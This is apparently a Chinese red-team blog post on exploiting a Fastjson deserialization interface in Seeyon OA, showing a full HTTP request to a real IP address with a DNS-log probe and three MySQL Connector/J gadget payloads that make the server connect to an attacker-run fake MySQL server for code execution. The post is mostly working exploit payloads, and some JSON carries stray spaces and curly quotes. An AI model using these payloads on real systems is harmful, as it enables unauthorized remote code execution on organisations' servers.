---
layout: post
title: SeeyonFastjson利用链

---

## 0x01  前言

前段时间刚结束一场hvv，现场遇到了这样的情况，存在seeyon的fastjson接口但是利用链不行。

后来请教wal613师傅，换了mysql connector的利用链，前提是seeyon的数据库用的是Mysql

## 0x02  接口1

```
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: 125.35.108.68:9090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://125.35.108.68:9090/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://125.35.108.68:9090/seeyon/main.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=9845FB928E346136D2356099A6862683; loginPageURL=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

_json_params={"@type":"java.net.Inet4Address","val":"k6suli.dnslog.cn"}
```

dnslog有回显，但是看了网上执行命令的方法，都是一直失败

参考这篇文章，http://www.hackdig.com/08/hack-439516.htm

https://github.com/fnmsd/MySQL_Fake_Server

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105151149.png)

vps上执行 python server.py，yso看了下这篇文章中师傅改的https://www.anquanke.com/post/id/203086，最后为了打回显，使用了wal613师傅改的yso

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105151234.png)

本地搭建安装的时候有这么个东西，就是后文利用链里面需要的mysql-connector

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105142552.png)

这个要装对应的jdbc驱动，比如mysql-connector-java-5.1.38-bin.jar

## 0x03利用链

### Mysql connector 5.1x

```json
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConn  ectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":”pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDese  rialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":”dbname" , "url":""}
```

### Mysql connector 6.0.2 or 6.0.3

```json
{"@type": "java.lang.AutoCloseable" ,"@type":  "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection" ,"proxy":{"connectionString":{"url":  "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}
```

###  Mysql connector 6.x or < 8.0.20

```json
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnecti  on","proxy":{"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy","connectionUrl":{ "@typ e":"com.mysql.cj.conf.url.ReplicationConnectionUrl" , "masters": [{"host":"mysql.host"}],  "slaves":[],  "properties":{"host":"mysql.host","user":"user","dbname":"dbname","password":"pass","quer  yInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserial  ize":"true"}}}}
```

## 0x04 实战场景中的回显

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152116.png)

服务端中找到回显CommonsBeanutils1Tomcat89Echo

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152204.png)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20211105152358.png)

## 参考资料

https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf

http://www.hackdig.com/08/hack-439516.htm

https://www.anquanke.com/post/id/203086

致远OA fastjson mysql connector 利用链  wal613

